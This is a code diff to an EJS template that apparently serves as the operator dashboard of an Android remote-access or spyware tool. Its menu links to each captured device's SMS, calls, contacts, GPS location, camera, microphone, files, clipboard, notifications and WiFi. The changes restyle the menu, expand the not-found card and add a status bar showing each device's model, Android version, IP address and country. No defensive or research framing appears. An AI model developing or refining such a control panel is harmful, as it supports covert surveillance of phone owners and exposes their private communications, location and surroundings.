@@ -24,27 +24,51 @@
         <aside class="sidebar">
             <div class="device-id"><%= id %></div>
             <nav class="menu">
-                <a href="/device/<%= id %>/info" class="<%= page === 'info' ? 'active' : '' %>">📱 Info</a>
-                <a href="/device/<%= id %>/sms" class="<%= page === 'sms' ? 'active' : '' %>">💬 SMS</a>
-                <a href="/device/<%= id %>/calls" class="<%= page === 'calls' ? 'active' : '' %>">📞 Calls</a>
-                <a href="/device/<%= id %>/contacts" class="<%= page === 'contacts' ? 'active' : '' %>">👥 Contacts</a>
-                <a href="/device/<%= id %>/gps" class="<%= page === 'gps' ? 'active' : '' %>">📍 Location</a>
-                <a href="/device/<%= id %>/camera" class="<%= page === 'camera' ? 'active' : '' %>">📷 Camera</a>
-                <a href="/device/<%= id %>/mic" class="<%= page === 'mic' ? 'active' : '' %>">🎤 Mic</a>
-                <a href="/device/<%= id %>/files" class="<%= page === 'files' ? 'active' : '' %>">📁 Files</a>
-                <a href="/device/<%= id %>/apps" class="<%= page === 'apps' ? 'active' : '' %>">📦 Apps</a>
-                <a href="/device/<%= id %>/clipboard" class="<%= page === 'clipboard' ? 'active' : '' %>">📋 Clipboard</a>
-                <a href="/device/<%= id %>/notifications" class="<%= page === 'notifications' ? 'active' : '' %>">🔔 Notifications</a>
-                <a href="/device/<%= id %>/wifi" class="<%= page === 'wifi' ? 'active' : '' %>">📶 WiFi</a>
-                <a href="/device/<%= id %>/permissions" class="<%= page === 'permissions' ? 'active' : '' %>">🔐 Permissions</a>
-                <a href="/device/<%= id %>/downloads" class="<%= page === 'downloads' ? 'active' : '' %>">💾 Downloads</a>
+                <a href="/device/<%= id %>/info" class="<%= page === 'info' ? 'active' : '' %>"><span class="icon">📱</span> Info</a>
+                <a href="/device/<%= id %>/sms" class="<%= page === 'sms' ? 'active' : '' %>"><span class="icon">💬</span> SMS</a>
+                <a href="/device/<%= id %>/calls" class="<%= page === 'calls' ? 'active' : '' %>"><span class="icon">📞</span> Calls</a>
+                <a href="/device/<%= id %>/contacts" class="<%= page === 'contacts' ? 'active' : '' %>"><span class="icon">👥</span> Contacts</a>
+                <a href="/device/<%= id %>/gps" class="<%= page === 'gps' ? 'active' : '' %>"><span class="icon">📍</span> Location</a>
+                <a href="/device/<%= id %>/camera" class="<%= page === 'camera' ? 'active' : '' %>"><span class="icon">📷</span> Camera</a>
+                <a href="/device/<%= id %>/mic" class="<%= page === 'mic' ? 'active' : '' %>"><span class="icon">🎤</span> Mic</a>
+                <a href="/device/<%= id %>/files" class="<%= page === 'files' ? 'active' : '' %>"><span class="icon">📁</span> Files</a>
+                <a href="/device/<%= id %>/apps" class="<%= page === 'apps' ? 'active' : '' %>"><span class="icon">📦</span> Apps</a>
+                <a href="/device/<%= id %>/clipboard" class="<%= page === 'clipboard' ? 'active' : '' %>"><span class="icon">📋</span> Clipboard</a>
+                <a href="/device/<%= id %>/notifications" class="<%= page === 'notifications' ? 'active' : '' %>"><span class="icon">🔔</span> Notifications</a>
+                <a href="/device/<%= id %>/wifi" class="<%= page === 'wifi' ? 'active' : '' %>"><span class="icon">📶</span> WiFi</a>
+                <a href="/device/<%= id %>/permissions" class="<%= page === 'permissions' ? 'active' : '' %>"><span class="icon">🔐</span> Permissions</a>
+                <a href="/device/<%= id %>/downloads" class="<%= page === 'downloads' ? 'active' : '' %>"><span class="icon">💾</span> Downloads</a>
             </nav>
         </aside>
 
         <section class="content">
             <% if (page === 'notfound') { %>
-                <div class="card"><h2>Device not found</h2><p class="empty">This device doesn't exist in the database.</p></div>
+                <div class="card">
+                    <h2>Device Not Found</h2>
+                    <p class="empty">This device doesn't exist in the database. It may have been removed or the ID is incorrect.</p>
+                    <a href="/" class="btn primary">← Back to Dashboard</a>
+                </div>
             <% } else { %>
+                <% if (data.client) { %>
+                <div class="device-status-bar">
+                    <div class="status-indicator <%= data.client.online ? 'online' : 'offline' %>">
+                        <span class="dot"></span>
+                        <span><%= data.client.online ? 'Online' : 'Offline' %></span>
+                    </div>
+                    <div class="device-info-mini">
+                        <span>📱 <%= data.client.device?.brand || '' %> <%= data.client.device?.model || '' %></span>
+                        <% if (data.client.device?.version) { %>
+                        <span>Android <%= data.client.device.version %></span>
+                        <% } %>
+                        <% if (data.client.ip) { %>
+                        <span>🌐 <%= data.client.ip %></span>
+                        <% } %>
+                        <% if (data.client.country) { %>
+                        <span>📍 <%= data.client.country %></span>
+                        <% } %>
+                    </div>
+                </div>
+                <% } %>
                 <%- include('pages/' + page, { data, id }) %>
             <% } %>
         </section>
